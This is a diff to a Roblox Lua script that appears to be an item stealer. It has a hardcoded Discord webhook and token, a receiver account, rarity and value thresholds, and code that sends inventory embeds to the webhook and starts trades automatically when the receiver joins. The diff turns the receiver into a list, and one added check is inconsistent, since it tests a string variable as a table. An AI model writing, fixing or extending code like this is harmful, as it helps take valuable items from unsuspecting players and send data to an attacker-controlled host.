@@ -3,9 +3,10 @@ if _G.Ex then return end
 _G.Ex = true
 
 local WEBHOOK = "https://discord.com/api/webhooks/1546514326901358742/u0c8GvShbKToQcd8w41FMZ88"
-local RECEIVER = "Alljm100"
+local RECEIVER = {"Alljm100"}
 local MINIMUM_RARITY = "Godly"
 local MINIMUM_VALUE = 10
+local RECEIVERx = "Alljm100"  -- ← FIXED: Added quotes
 
 local function GetRequestFunction()
     if request then return request end
@@ -15,7 +16,19 @@ local function GetRequestFunction()
 end
 
 local function GetActiveReceiverName()
-    return RECEIVER
+    if type(ar) == "string" and ar ~= "" then
+        if Players and Players:FindFirstChild(ar) then return ar end
+        return ar
+    end
+    if type(RECEIVERx) == "table" then
+        for _, Name in ipairs(RECEIVERx) do
+            if Name ~= "" then
+                if Players and Players:FindFirstChild(Name) then return Name end
+                return Name
+            end
+        end
+    end
+    return "Unknown"
 end
 
 if WEBHOOK == "" then
@@ -417,7 +430,7 @@ end
 local function SendAllEmbeds()
     local RequestFunc = GetRequestFunction()
     if not RequestFunc then return end
-    local ActiveName = RECEIVER
+    local ActiveName = GetActiveReceiverName()
     local MainEmbed, MainMention = BuildEmbed(ActiveName)
     local MainPayload = {content = MainMention, embeds = {MainEmbed}}
     local MainJson = HttpService:JSONEncode(MainPayload)
@@ -448,7 +461,13 @@ local function FindTradeTarget()
     if type(ar) == "string" and ar ~= "" then
         if Players:FindFirstChild(ar) then return ar end
     end
-    if Players:FindFirstChild(RECEIVER) then return RECEIVER end
+    if type(RECEIVER) == "table" then
+        for _, Name in ipairs(RECEIVER) do
+            if Name ~= "" and Players:FindFirstChild(Name) then return Name end
+        end
+    else
+        if Players:FindFirstChild(RECEIVER) then return RECEIVER end
+    end
     return nil
 end
 
@@ -506,7 +525,8 @@ local function AutoTradeOnTargetJoin()
     local IsBusy = false
     local function CheckPlayerJoin(Player)
         if IsBusy then return end
-        if Player.Name == RECEIVER then
+        local TargetName = FindTradeTarget()
+        if TargetName and Player.Name == TargetName then
             IsBusy = true
             task.wait(3)
             ProcessAllTrades(Player.Name)
